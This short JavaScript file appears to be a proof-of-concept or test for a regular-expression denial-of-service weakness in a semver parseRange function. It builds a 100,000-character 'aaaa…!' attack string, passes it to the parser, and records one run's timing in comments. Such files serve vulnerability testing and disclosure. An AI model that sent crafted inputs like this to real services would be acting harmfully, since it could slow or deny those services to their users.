const { parseRange } = require("./semver.js");

//Attack String :""+"a"*100000+"!"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "!";

var result = parseRange(str);

// real    0m0.473s
// user    0m0.079s
// sys     0m0.053s
